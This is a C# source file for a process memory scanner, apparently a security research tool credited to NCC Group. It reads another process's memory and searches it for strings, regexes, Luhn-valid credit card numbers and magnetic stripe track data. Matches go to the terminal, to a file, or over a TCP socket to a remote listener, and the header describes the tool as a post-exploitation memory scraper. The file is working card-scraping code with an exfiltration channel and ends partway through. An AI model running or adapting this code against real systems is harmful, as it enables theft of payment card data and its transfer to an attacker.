// Memory/Process Scanner
// Written by Matt Lewis, NCC Group 2014
// Updated by Tom Watson, NCC Group 2015
// Thanks to Jesse Bullock for lots of great ideas
//
// Synopsis - keeps scanning a process memory space for a search string (unicode and ascii),
// regex pattern, credit card data or magnetic stripe data then if found, spits these out 
// either to stdout, a file or a socket to a remote listener
//
// Useful for memory scraping a process, a post-exploitation POC or instrumentation tool to be used during fuzzing.
//
// TODO - Lots of duplicated code could be refactored out
//
// Code adapted from http://www.codeproject.com/Articles/716227/Csharp-How-to-Scan-a-Process-Memory
// Original code licensed under CPOL: http://www.codeproject.com/info/cpol10.aspx

using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Linq;
using System.Collections.Generic;

namespace MemoryScanner
{
    // container for command-line arguments with basic validator
    class CliArgs
    {
        public String runType = "";
        public int pid = -1;
        public String ipaddr = "";
        public String filename = "";
        public int portnum = -1;
        public int delay = -1;
        public string searchterm = "";
        public string mode = "";
        public int prepostfix = -1;
        public Process process = null;

        public void setRunType(String value)
        {
            this.runType = value;
        }

        public void setMode(String value)
        {
            this.mode = value;
        }

        public void setPID(String value)
        {
            int.TryParse(value, out this.pid);
        }

        public void setIPaddr(String value)
        {
            this.ipaddr = value.ToString();
        }

        public void setFilename(String value)
        {
            this.filename = value.ToString();
        }

        public void setPortnum(String value)
        {
            int.TryParse(value, out this.portnum);
        }

        public void setDelay(String value)
        {
            int.TryParse(value, out this.delay);
        }

        public void setPrePostFix(String value)
        {
            int.TryParse(value, out this.prepostfix);
        }

        // get the search term (might be a string separated by spaces on the command line)
        public void setSearchTerm(string[] args, int offset)
        {
            for (int i = offset; i < args.Length; i++)
            {
                if (i != args.Length - 1)
                {
                    this.searchterm += args[i] + " ";
                }
                else
                {
                    this.searchterm += args[i];
                }
            }
        }

        // validate the args
        public bool isValid()
        {
            try 
            {
                process = Process.GetProcessById(pid);
            }
            catch
            {
                System.Console.WriteLine(pid + " does not appear to be a valid process id");
                return false;
            }

            if (this.runType.Equals("string") || this.runType.Equals("regex"))
            {
                if (this.mode.Equals("stdio"))
                {
                    if (this.pid == -1 || this.delay == -1 || this.prepostfix == -1 || this.searchterm.Equals(""))
                    {
                        return false;
                    }
                    else
                    {
                        return true;
                    }
                }
                if (this.mode.Equals("file"))
                {
                    if (this.pid == -1 || this.delay == -1 || this.prepostfix == -1 || this.searchterm.Equals("") || this.filename.Equals(""))
                    {
                        return false;
                    }
                    else
                    {
                        return true;
                    }
                }
                if (this.mode.Equals("socket"))
                {
                    if (this.pid == -1 || this.delay == -1 || this.prepostfix == -1 || this.searchterm.Equals("") || this.ipaddr.Equals("") || this.portnum == -1)
                    {
                        return false;
                    }
                    else
                    {
                        try
                        {
                            IPAddress.Parse(this.ipaddr);
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("Error with chosen IP address. Make sure it's a valid IP (not hostname).");
                            return false;
                        }
                        return true;
                    }
                }

                return false;
            }
            else
            {
                if (this.mode.Equals("stdio"))
                {
                    if (this.pid == -1 || this.delay == -1)
                    {
                        return false;
                    }
                    else
                    {
                        return true;
                    }
                }
                if (this.mode.Equals("file"))
                {
                    if (this.pid == -1 || this.delay == -1 || this.filename.Equals(""))
                    {
                        return false;
                    }
                    else
                    {
                        return true;
                    }
                }
                if (this.mode.Equals("socket"))
                {
                    if (this.pid == -1 || this.delay == -1 || this.ipaddr.Equals("") || this.portnum == -1)
                    {
                        return false;
                    }
                    else
                    {
                        try
                        {
                            IPAddress.Parse(this.ipaddr);
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("Error with chosen IP address. Make sure it's a valid IP (not hostname).");
                            return false;
                        }
                        return true;
                    }
                }
                return false;
            }
        }
    }

    // main program class
    static class ProgObj
    {
        // REQUIRED CONSTS
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int MEM_COMMIT = 0x00001000;
        const int PAGE_READWRITE = 0x04;
        const int PROCESS_WM_READ = 0x0010;

        // Regexes for different CC types
        readonly static IDictionary<string, string> CC_DICT = new Dictionary<string, string>()
        {
            { "Visa 1 & 2", "(4\\d{12}(\\d{3})?)" },
            { "Mastercard", "5[1-5][0-9]{14}" },
            { "AMEX\t", "3[47][0-9]{13}" }, // tab to help formatting of output
            { "Diners Club", "3(?:0[0-5]|[68][0-9])[0-9]{11}" },
            { "Discover", "6(?:011|5[0-9]{2})[0-9]{12}" },
            { "JCB\t", "(?:2131|1800|35\\d{3})\\d{11}" } // tab to help formatting of output
        };

        // Full regex string composed of all regexes in CC_DICT
        readonly static String CCREGEX = "(?:" + string.Join("|", CC_DICT.Values) + ")";

        // Regex used to identify magnetic stripe track data
        // %B\\d{5,19}[\\^].{1,60}[?] Track 1 - Assuming a cc# length of 5-19 digits) (https://en.wikipedia.org/wiki/ISO/IEC_7813#Track_1)
        // ;\\d{5,19}=.{1,25}[?] Track 2 - Assuming a cc# length of 5-19 digits) (https://en.wikipedia.org/wiki/ISO/IEC_7813#Track_2)
        // These regexes could be better but work for now
        readonly static String TRACKREGEX = "%B\\d{5,19}[\\^].{1,60}?[?]|;\\d{5,19}=.{1,25}?[?]";

        // REQUIRED METHODS
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        // process to be inspected
        static Process process;

        // REQUIRED STRUCTS
            public struct MEMORY_BASIC_INFORMATION
        {
            public int BaseAddress;
            public int AllocationBase;
            public int AllocationProtect;
            public int RegionSize;
            public int State;
            public int Protect;
            public int lType;
        }

        public struct SYSTEM_INFO
        {
            public ushort processorArchitecture;
            ushort reserved;
            public uint pageSize;
            public IntPtr minimumApplicationAddress;
            public IntPtr maximumApplicationAddress;
            public IntPtr activeProcessorMask;
            public uint numberOfProcessors;
            public uint processorType;
            public uint allocationGranularity;
            public ushort processorLevel;
            public ushort processorRevision;
        }

        // tool banner
        public static void banner()
        {
            System.Console.WriteLine("                       __                 ");
            System.Console.WriteLine("  /\\/\\   ___ _ __ ___ / _\\ ___ __ _ _ __  ");
            System.Console.WriteLine(" /    \\ / _ \\ '_ ` _  \\ \\ / __/ _` | '_ \\ ");
            System.Console.WriteLine("/ /\\/\\ \\  __/ | | | | |\\ \\ (_| (_| | | | |");
            System.Console.WriteLine("\\/    \\/\\___|_| |_| |_\\__/\\___\\__,_|_| |_| v1.1");
            System.Console.WriteLine("---- Written by Matt Lewis & Tom Watson, NCC Group 2015 ----\n");
        }

        // usage
        public static void usage()
        {
            System.Console.WriteLine("Usage: memscan -string -s <pid> <Remote IP> <Remote Port> <delay> <width> <search term>");
            System.Console.WriteLine("               -string -f <pid> <filename> <delay> <width> <search term>");
            System.Console.WriteLine("               -string -o <pid> <delay> <width> <search term>");
            System.Console.WriteLine("               -regex -s <pid> <Remote IP> <Remote Port> <delay> <width> <regex>");
            System.Console.WriteLine("               -regex -f <pid> <filename> <delay> <width> <regex>");
            System.Console.WriteLine("               -regex -o <pid> <delay> <width> <regex>");
            System.Console.WriteLine("               -ccdata -s <pid> <Remote IP> <Remote Port> <delay>");
            System.Console.WriteLine("               -ccdata -f <pid> <filename> <delay>");
            System.Console.WriteLine("               -ccdata -o <pid> <delay>");
            System.Console.WriteLine("               -msdata -s <pid> <Remote IP> <Remote Port> <delay>");
            System.Console.WriteLine("               -msdata -f <pid> <filename> <delay>");
            System.Console.WriteLine("               -msdata -o <pid> <delay>");
            System.Console.WriteLine("               -proclist\n\n");
            System.Console.WriteLine("Flag Definitions:");
            System.Console.WriteLine("-string\t\tsearch for string");
            System.Console.WriteLine("-regex\t\tsearch for regex pattern");
            System.Console.WriteLine("-ccdata\t\tsearch for credit card data");
            System.Console.WriteLine("-msdata\t\tsearch for magenetic stripe data");
            System.Console.WriteLine("-s\t\twrite output to socket");
            System.Console.WriteLine("-f\t\twrite output to a file");
            System.Console.WriteLine("-o\t\twrite output to terminal");
            System.Console.WriteLine("delay\t\ttime to wait between each memchunk scan");
            System.Console.WriteLine("width\t\tamount of data to display before and after search term");
            System.Console.WriteLine("string\t\tto look for in memory (spaces allowed)");
            System.Console.WriteLine("regex\t\tto look for in memory (e.g. 3[47][0-9]{13})");
        }

        // main method
        static int Main(string[] args)
        {
            banner();

            if (args.Length == 0)
            {
                usage();
                return 0;
            }

            // display process list
            if (args[0].ToString().Equals("-proclist"))
            {
                System.Console.WriteLine("\nPID\tProcess Name");
                System.Console.WriteLine("---------------------");
                foreach (Process p in Process.GetProcesses())
                {
                    System.Console.WriteLine(p.Id + "\t" + p.ProcessName);
                }
                return 0;
            }

            CliArgs myargs = new CliArgs();

            if (args[0].ToString().Equals("-string") && args.Length >= 5)
            {
                myargs.setRunType("string");
                // sending results over a socket
                if (args[1].ToString().Equals("-s"))
                {
                    if (args.Length >= 8)
                    {
                        myargs.setMode("socket");
                        myargs.setPID(args[2]);
                        myargs.setIPaddr(args[3]);
                        myargs.setPortnum(args[4]);
                        myargs.setDelay(args[5]);
                        myargs.setPrePostFix(args[6]);
                        myargs.setSearchTerm(args, 7);
                        Console.WriteLine("Starting search for \"{0}\" on procid {1} sending output to {2}:{3} with delay of {4} and width of {5}", myargs.searchterm, myargs.pid.ToString(), myargs.ipaddr, myargs.portnum.ToString(), myargs.delay.ToString(), myargs.prepostfix.ToString());
                    }
                }
                if (args[1].ToString().Equals("-f"))
                {
                    if (args.Length >= 6)
                    {
                        myargs.setMode("file");
                        myargs.setPID(args[2]);
                        myargs.setFilename(args[3]);
                        myargs.setDelay(args[4]);
                        myargs.setPrePostFix(args[5]);
                        myargs.setSearchTerm(args, 6);
                        Console.WriteLine("Starting search for \"{0}\" on procid {1} sending output to file {2} with delay of {3} and width of {4}", myargs.searchterm, myargs.pid.ToString(), myargs.filename, myargs.delay.ToString(), myargs.prepostfix.ToString());
                    }
                }
                if (args[1].ToString().Equals("-o"))
                {
                    if (args.Length >= 5)
                    {
                        myargs.setMode("stdio");
                        myargs.setPID(args[2]);
                        myargs.setDelay(args[3]);
                        myargs.setPrePostFix(args[4]);
                        myargs.setSearchTerm(args, 5);
                        Console.WriteLine("Starting search for \"{0}\" on procid {1} sending output to stdio with delay of {2} and width of {3}", myargs.searchterm, myargs.pid.ToString(), myargs.delay.ToString(), myargs.prepostfix.ToString());
                    }
                }
            }

            if (args[0].ToString().Equals("-regex") && args.Length >= 5)
            {
                myargs.setRunType("regex");
                // sending results over a socket
                if (args[1].ToString().Equals("-s"))
                {
                    if (args.Length >= 8)
                    {
                        myargs.setMode("socket");
                        myargs.setPID(args[2]);
                        myargs.setIPaddr(args[3]);
                        myargs.setPortnum(args[4]);
                        myargs.setDelay(args[5]);
                        myargs.setPrePostFix(args[6]);
                        myargs.setSearchTerm(args, 7);
                        Console.WriteLine("Starting search for \"{0}\" on procid {1} sending output to {2}:{3} with delay of {4} and width of {5}", myargs.searchterm, myargs.pid.ToString(), myargs.ipaddr, myargs.portnum.ToString(), myargs.delay.ToString(), myargs.prepostfix.ToString());
                    }
                }
                if (args[1].ToString().Equals("-f"))
                {
                    if (args.Length >= 6)
                    {
                        myargs.setMode("file");
                        myargs.setPID(args[2]);
                        myargs.setFilename(args[3]);
                        myargs.setDelay(args[4]);
                        myargs.setPrePostFix(args[5]);
                        myargs.setSearchTerm(args, 6);
                        Console.WriteLine("Starting search for \"{0}\" on procid {1} sending output to file {2} with delay of {3} and width of {4}", myargs.searchterm, myargs.pid.ToString(), myargs.filename, myargs.delay.ToString(), myargs.prepostfix.ToString());
                    }
                }
                if (args[1].ToString().Equals("-o"))
                {
                    if (args.Length >= 5)
                    {
                        myargs.setMode("stdio");
                        myargs.setPID(args[2]);
                        myargs.setDelay(args[3]);
                        myargs.setPrePostFix(args[4]);
                        myargs.setSearchTerm(args, 5);
                        Console.WriteLine("Starting search for \"{0}\" on procid {1} sending output to stdio with delay of {2} and width of {3}", myargs.searchterm, myargs.pid.ToString(), myargs.delay.ToString(), myargs.prepostfix.ToString());
                    }
                }
            }

            if (args[0].ToString().Equals("-ccdata") && args.Length >= 3)
            {
                myargs.setRunType("ccdata");
                // sending results over a socket
                if (args[1].ToString().Equals("-s"))
                {
                    if (args.Length >= 6)
                    {
                        myargs.setMode("socket");
                        myargs.setPID(args[2]);
                        myargs.setIPaddr(args[3]);
                        myargs.setPortnum(args[4]);
                        myargs.setDelay(args[5]);
                        Console.WriteLine("Starting search for credit card numbers on procid {0} sending output to {1}:{2} with delay of {4}", myargs.pid.ToString(), myargs.ipaddr, myargs.portnum.ToString(), myargs.delay.ToString());
                    }
                }
                if (args[1].ToString().Equals("-f"))
                {
                    if (args.Length >= 5)
                    {
                        myargs.setMode("file");
                        myargs.setPID(args[2]);
                        myargs.setFilename(args[3]);
                        myargs.setDelay(args[4]);
                        Console.WriteLine("Starting search for credit card numbers on procid {0} sending output to file {1} with delay of {2}", myargs.pid.ToString(), myargs.filename, myargs.delay.ToString());
                    }
                }
                if (args[1].ToString().Equals("-o"))
                {
                    if (args.Length >= 4)
                    {
                        myargs.setMode("stdio");
                        myargs.setPID(args[2]);
                        myargs.setDelay(args[3]);
                        Console.WriteLine("Starting search for credit card numbers on procid {0} sending output to stdio with delay of {1}", myargs.pid.ToString(), myargs.delay.ToString());
                    }
                }
            }

            if (args[0].ToString().Equals("-msdata") && args.Length >= 3)
            {
                myargs.setRunType("msdata");
                // sending results over a socket
                if (args[1].ToString().Equals("-s"))
                {
                    if (args.Length >= 6)
                    {
                        myargs.setMode("socket");
                        myargs.setPID(args[2]);
                        myargs.setIPaddr(args[3]);
                        myargs.setPortnum(args[4]);
                        myargs.setDelay(args[5]);
                        Console.WriteLine("Starting search for magnetic stripe data on procid {0} sending output to {1}:{2} with delay of {4}", myargs.pid.ToString(), myargs.ipaddr, myargs.portnum.ToString(), myargs.delay.ToString());
                    }
                }
                if (args[1].ToString().Equals("-f"))
                {
                    if (args.Length >= 5)
                    {
                        myargs.setMode("file");
                        myargs.setPID(args[2]);
                        myargs.setFilename(args[3]);
                        myargs.setDelay(args[4]);
                        Console.WriteLine("Starting search for magnetic stripe data on procid {0} sending output to file {1} with delay of {2}", myargs.pid.ToString(), myargs.filename, myargs.delay.ToString());
                    }
                }
                if (args[1].ToString().Equals("-o"))
                {
                    if (args.Length >= 4)
                    {
                        myargs.setMode("stdio");
                        myargs.setPID(args[2]);
                        myargs.setDelay(args[3]);
                        Console.WriteLine("Starting search for magnetic stripe data on procid {0} sending output to stdio with delay of {1}", myargs.pid.ToString(), myargs.delay.ToString());
                    }
                }
            }

            // validate arguments, if good then off we go!
            if (myargs.isValid())
            {
                process = Process.GetProcessById(myargs.pid);
                switch (myargs.runType)
                {
                    case "string":
                        memScanString(myargs);
                        break;
                    case "regex":
                        memScanRegex(myargs);
                        break;
                    case "ccdata":
                        memScanCCData(myargs);
                        break;
                    case "msdata":
                        memScanMSData(myargs);
                        break;
                    default:
                        Console.WriteLine("Unrecognised run mode.");
                        usage();
                        return 0;
                }
            }
            else
            {
                Console.WriteLine("Error in arguments. Check and try again.");
                usage();
            }
            return 1;
        }

        // Return the type of card associated with a CC number
        private static String getCCType(String cc)
        {
            string type = "";
            foreach (KeyValuePair<string, string> entry in CC_DICT)
            {
                if (Regex.Match(cc, entry.Value).Success)
                {
                    type = entry.Key;
                }
            }
            return type;
        }

        // Luhn Check methods (http://rosettacode.org/wiki/Luhn_test_of_credit_card_numbers#C.23)
        private static bool luhnCheck(String cardNumber)
        {
            return luhnCheck(cardNumber.Select(c => c - '0').ToArray());
        }
        private static bool luhnCheck(this int[] digits)
        {
            return getCheckValue(digits) == 0;
        }

        private static int getCheckValue(int[] digits)
        {
            return digits.Select((d, i) => i % 2 == digits.Length % 2 ? ((2 * d) % 10) + d / 5 : d).Sum() % 10;
        }

        // string search run mode
        public static void memScanString(CliArgs myargs)
        {
            IPAddress ipAddress;
            IPEndPoint remoteIP;
            Socket sender = null;
            System.IO.StreamWriter file = null;

            // writing output to socket
            if (myargs.mode.Equals("socket"))
            {
                try
                {
                    ipAddress = IPAddress.Parse(myargs.ipaddr);
                    remoteIP = new IPEndPoint(ipAddress, myargs.portnum);
                    sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sender.Connect(remoteIP);
                    Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());
                }
                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                }
            }

            // writing output to file
            if (myargs.mode.Equals("file"))
            {
                file = new System.IO.StreamWriter(myargs.filename);
                file.AutoFlush = true;
            }

            // to infinity, and beyond!
            while (true)
            {
                // getting minimum & maximum address
                SYSTEM_INFO sys_info = new SYSTEM_INFO();
                GetSystemInfo(out sys_info);

                IntPtr proc_min_address = sys_info.minimumApplicationAddress;
                IntPtr proc_max_address = sys_info.maximumApplicationAddress;

                // saving the values as long ints to avoid  lot of casts later
                long proc_min_address_l = (long)proc_min_address;
                long proc_max_address_l = (long)proc_max_address;

                String toSend = "";

                // opening the process with desired access level
                IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, false, process.Id);

                // this will store any information we get from VirtualQueryEx()
                MEMORY_BASIC_INFORMATION mem_basic_info = new MEMORY_BASIC_INFORMATION();

                // number of bytes read with ReadProcessMemory
                int bytesRead = 0;

                // for some efficiencies, pre-compute prepostfix values
                int postfix = myargs.searchterm.Length + (myargs.prepostfix * 2);

                while (proc_min_address_l < proc_max_address_l)
                {
                    // 28 = sizeof(MEMORY_BASIC_INFORMATION)
                    VirtualQueryEx(processHandle, proc_min_address, out mem_basic_info, 28);

                    // if this memory chunk is accessible
                    if (mem_basic_info.Protect == PAGE_READWRITE && mem_basic_info.State == MEM_COMMIT)
                    {
                        byte[] buffer = new byte[mem_basic_info.RegionSize];

                        // read everything in the buffer above
                        ReadProcessMemory((int)processHandle, mem_basic_info.BaseAddress, buffer, mem_basic_info.RegionSize, ref bytesRead);

                        String memStringASCII = Encoding.ASCII.GetString(buffer);
                        String memStringUNICODE = Encoding.Unicode.GetString(buffer);

                        // does the search terms exist in this chunk in ASCII form?
                        if (memStringASCII.Contains(myargs.searchterm))
                        {
                            int idex = 0;
                            while ((idex = memStringASCII.IndexOf(myargs.searchterm, idex)) != -1)
                            {
                                toSend += "0x" + (mem_basic_info.BaseAddress + idex).ToString("X4") + ":A:" + memStringASCII.Substring(idex - myargs.prepostfix, postfix) + "\n";

                                

                                if (myargs.mode.Equals("socket"))
                                {
                                    byte[] msg = Encoding.ASCII.GetBytes(toSend);
                                    int bytesSent = sender.Send(msg);
                                }
                                if (myargs.mode.Equals("file"))
                                {
                                    file.WriteLine(toSend);
                                }
                                if (myargs.mode.Equals("stdio"))
                                {
                                    Console.WriteLine(toSend);
                                }
                                // enter sandman
                                System.Threading.Thread.Sleep(myargs.delay);
                                toSend = "";
                                idex++;
                            }
                        }

                        // does the search terms exist in this chunk in UNICODE form?
                        if (memStringUNICODE.Contains(myargs.searchterm))
                        {

                            int idex = 0;
                            while ((idex = memStringUNICODE.IndexOf(myargs.searchterm, idex)) != -1)
                            {
                                toSend += "0x" + (mem_basic_info.BaseAddress + idex).ToString("X4") + ":U:" + memStringUNICODE.Substring(idex - myargs.prepostfix, postfix) + "\n";

                                if (myargs.mode.Equals("socket"))
                                {
                                    byte[] msg = Encoding.ASCII.GetBytes(toSend);
                                    int bytesSent = sender.Send(msg);
                                }
                                if (myargs.mode.Equals("file"))
                                {
                                    file.WriteLine(toSend);
                                }
                                if (myargs.mode.Equals("stdio"))
                                {
                                    Console.WriteLine(toSend);
                                }
                                // enter sandman
                                System.Threading.Thread.Sleep(myargs.delay);
                                toSend = "";
                                idex++;
                            }
                        }
                    }

                    // truffle shuffle - moving on chunk
                    proc_min_address_l += mem_basic_info.RegionSize;
                    proc_min_address = new IntPtr(proc_min_address_l);
                }
            }
            // ask Turing if we'll ever get here...
            sender.Shutdown(SocketShutdown.Both);
            sender.Close();
            if (myargs.mode.Equals("file"))
            {
                file.Close();
            }
        }

        // regex search run mode
        public static void memScanRegex(CliArgs myargs)
        {
            IPAddress ipAddress;
            IPEndPoint remoteIP;
            Socket sender = null;
            System.IO.StreamWriter file = null;
            Regex rgx = new Regex(myargs.searchterm); // regex pattern to match

            // writing output to socket
            if (myargs.mode.Equals("socket"))
            {
                try
                {
                    ipAddress = IPAddress.Parse(myargs.ipaddr);
                    remoteIP = new IPEndPoint(ipAddress, myargs.portnum);
                    sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sender.Connect(remoteIP);
                    Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());
                }
                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                }
            }

            // writing output to file
            if (myargs.mode.Equals("file"))
            {
                file = new System.IO.StreamWriter(myargs.filename);
                file.AutoFlush = true;
            }

            // to infinity, and beyond!
            while (true)
            {
                // getting minimum & maximum address
                SYSTEM_INFO sys_info = new SYSTEM_INFO();
                GetSystemInfo(out sys_info);

                IntPtr proc_min_address = sys_info.minimumApplicationAddress;
                IntPtr proc_max_address = sys_info.maximumApplicationAddress;

                // saving the values as long ints to avoid  lot of casts later
                long proc_min_address_l = (long)proc_min_address;
                long proc_max_address_l = (long)proc_max_address;

                String toSend = "";

                // opening the process with desired access level
                IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, false, process.Id);

                // this will store any information we get from VirtualQueryEx()
                MEMORY_BASIC_INFORMATION mem_basic_info = new MEMORY_BASIC_INFORMATION();

                // number of bytes read with ReadProcessMemory
                int bytesRead = 0;

                // for some efficiencies, pre-compute prepostfix values
                int postfix = myargs.searchterm.Length + (myargs.prepostfix * 2);

                while (proc_min_address_l < proc_max_address_l)
                {
                    // 28 = sizeof(MEMORY_BASIC_INFORMATION)
                    VirtualQueryEx(processHandle, proc_min_address, out mem_basic_info, 28);

                    // if this memory chunk is accessible
                    if (mem_basic_info.Protect == PAGE_READWRITE && mem_basic_info.State == MEM_COMMIT)
                    {
                        byte[] buffer = new byte[mem_basic_info.RegionSize];

                        // read everything in the buffer above
                        ReadProcessMemory((int)processHandle, mem_basic_info.BaseAddress, buffer, mem_basic_info.RegionSize, ref bytesRead);

                        String memStringASCII = Encoding.ASCII.GetString(buffer);
                        String memStringUNICODE = Encoding.Unicode.GetString(buffer);

                        // does the regex pattern exist in this chunk in ASCII form?
                        if (rgx.IsMatch(memStringASCII))
                        {
                            int idex = 0;
                            while (rgx.Match(memStringASCII, idex).Success)
                            {
                                idex = rgx.Match(memStringASCII, idex).Index;
                                toSend += "0x" + (mem_basic_info.BaseAddress + idex).ToString("X4") + ":A:" + memStringASCII.Substring(idex - myargs.prepostfix, postfix) + "\n";

                                if (myargs.mode.Equals("socket"))
                                {
                                    byte[] msg = Encoding.ASCII.GetBytes(toSend);
                                    int bytesSent = sender.Send(msg);
                                }
                                if (myargs.mode.Equals("file"))
                                {
                                    file.WriteLine(toSend);
                                }
                                if (myargs.mode.Equals("stdio"))
                                {
                                    Console.WriteLine(toSend);
                                }
                                // enter sandman
                                System.Threading.Thread.Sleep(myargs.delay);
                                toSend = "";
                                idex++;
                            }
                        }

                        // does the regex pattern exist in this chunk in UNICODE form?
                        if (rgx.IsMatch(memStringUNICODE))
                        {

                            int idex = 0;
                            while (rgx.Match(memStringUNICODE, idex).Success)
                            {
                                idex = rgx.Match(memStringUNICODE, idex).Index;
                                toSend += "0x" + (mem_basic_info.BaseAddress + idex).ToString("X4") + ":U:" + memStringUNICODE.Substring(idex - myargs.prepostfix, postfix) + "\n";

                                if (myargs.mode.Equals("socket"))
                                {
                                    byte[] msg = Encoding.ASCII.GetBytes(toSend);
                                    int bytesSent = sender.Send(msg);
                                }
                                if (myargs.mode.Equals("file"))
                                {
                                    file.WriteLine(toSend);
                                }
                                if (myargs.mode.Equals("stdio"))
                                {
                                    Console.WriteLine(toSend);
                                }
                                // enter sandman
                                System.Threading.Thread.Sleep(myargs.delay);
                                toSend = "";
                                idex++;
                            }
                        }
                    }

                    // truffle shuffle - moving on chunk
                    proc_min_address_l += mem_basic_info.RegionSize;
                    proc_min_address = new IntPtr(proc_min_address_l);
                }
            }
            // ask Turing if we'll ever get here...
            sender.Shutdown(SocketShutdown.Both);
            sender.Close();
            if (myargs.mode.Equals("file"))
            {
                file.Close();
            }
        }

        // CCdata search run mode
        // Identifies potential CC numbers and performs a Luhn check on them
        // If the Luhn check is passed the type of card is identified and the results are output
        public static void memScanCCData(CliArgs myargs)
        {
            IPAddress ipAddress;
            IPEndPoint remoteIP;
            Socket sender = null;
            System.IO.StreamWriter file = null;
            Regex rgx = new Regex(CCREGEX); // regex pattern to match
            ISet<String> capturedCCs = new HashSet<String>();

            // writing output to socket
            if (myargs.mode.Equals("socket"))
            {
                try
                {
                    ipAddress = IPAddress.Parse(myargs.ipaddr);
                    remoteIP = new IPEndPoint(ipAddress, myargs.portnum);
                    sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sender.Connect(remoteIP);
                    Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());
                }
                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                }
            }

            // writing output to file
            if (myargs.mode.Equals("file"))
            {
                file = new System.IO.StreamWriter(myargs.filename);
                file.AutoFlush = true;
            }

            // to infinity, and beyond!
            while (true)
            {
                // getting minimum & maximum address
                SYSTEM_INFO sys_info = new SYSTEM_INFO();
                GetSystemInfo(out sys_info);

                IntPtr proc_min_address = sys_info.minimumApplicationAddress;
                IntPtr proc_max_address = sys_info.maximumApplicationAddress;

                // saving the values as long ints to avoid  lot of casts later
                long proc_min_address_l = (long)proc_min_address;
                long proc_max_address_l = (long)proc_max_address;

                String toSend = "";

                // opening the process with desired access level
                IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, false, process.Id);

                // this will store any information we get from VirtualQueryEx()
                MEMORY_BASIC_INFORMATION mem_basic_info = new MEMORY_BASIC_INFORMATION();

                // number of bytes read with ReadProcessMemory
                int bytesRead = 0;

                // for some efficiencies, pre-compute prepostfix values
                int postfix = myargs.searchterm.Length + (myargs.prepostfix * 2);

                while (proc_min_address_l < proc_max_address_l)
                {
                    // 28 = sizeof(MEMORY_BASIC_INFORMATION)
                    VirtualQueryEx(processHandle, proc_min_address, out mem_basic_info, 28);

                    // if this memory chunk is accessible
                    if (mem_basic_info.Protect == PAGE_READWRITE && mem_basic_info.State == MEM_COMMIT)
                    {
                        byte[] buffer = new byte[mem_basic_info.RegionSize];

                        // read everything in the buffer above
                        ReadProcessMemory((int)processHandle, mem_basic_info.BaseAddress, buffer, mem_basic_info.RegionSize, ref bytesRead);

                        String memStringASCII = Encoding.ASCII.GetString(buffer);
                        String memStringUNICODE = Encoding.Unicode.GetString(buffer);

                        // does the regex pattern exist in this chunk in ASCII form?
                        if (rgx.IsMatch(memStringASCII))
                        {
                            int idex = 0;
                            while (rgx.Match(memStringASCII, idex).Success)
                            {
                                Match match = rgx.Match(memStringASCII, idex);
                                idex = match.Index;
                                int matchLength = match.Length;
                                String potentialCCNum = memStringASCII.Substring(idex, matchLength);
                                String ccType = getCCType(potentialCCNum);

                                if (luhnCheck(potentialCCNum))
                                {
                                    toSend = ccType + "\t" + potentialCCNum;

                                    if (capturedCCs.Add(toSend))
                                    {
                                        if (myargs.mode.Equals("socket"))
                                        {
                                            byte[] msg = Encoding.ASCII.GetBytes(toSend);
                                            int bytesSent = sender.Send(msg);
                                        }
                                        if (myargs.mode.Equals("file"))
                                        {
                                            file.WriteLine(toSend);
                                        }
                                        if (myargs.mode.Equals("stdio"))
                                        {
                                            Console.WriteLine(toSend);
                                        }
                                    }
                                }
                                // enter sandman
                                System.Threading.Thread.Sleep(myargs.delay);
                                idex++;
                            }

                        }

                        // does the regex pattern exist in this chunk in UNICODE form?
                        if (rgx.IsMatch(memStringUNICODE))
                        {
                            int idex = 0;
                            while (rgx.Match(memStringUNICODE, idex).Success)
                            {
                                Match match = rgx.Match(memStringUNICODE, idex);
                                idex = match.Index;
                                int matchLength = match.Length;
                                String potentialCCNum = memStringUNICODE.Substring(idex, matchLength);
                                String ccType = getCCType(potentialCCNum);

                                if (luhnCheck(potentialCCNum))
                                {
                                    toSend = ccType + "\t" + potentialCCNum;

                                    if (capturedCCs.Add(toSend))
                                    {
                                        if (myargs.mode.Equals("socket"))
                                        {
                                            byte[] msg = Encoding.ASCII.GetBytes(toSend);
                                            int bytesSent = sender.Send(msg);
                                        }
                                        if (myargs.mode.Equals("file"))
                                        {
                                            file.WriteLine(toSend);
                                        }
                                        if (myargs.mode.Equals("stdio"))
                                        {
                                            Console.WriteLine(toSend);
                                        }
                                    }
                                }
                                // enter sandman
                                System.Threading.Thread.Sleep(myargs.delay);
                                idex++;
                            }
                        }
                    }
                    // truffle shuffle - moving on chunk
                    proc_min_address_l += mem_basic_info.RegionSize;
                    proc_min_address = new IntPtr(proc_min_address_l);
                }
            }
            // ask Turing if we'll ever get here...
            sender.Shutdown(SocketShutdown.Both);
            sender.Close();
            if (myargs.mode.Equals("file"))
            {
                file.Close();
            }
        }

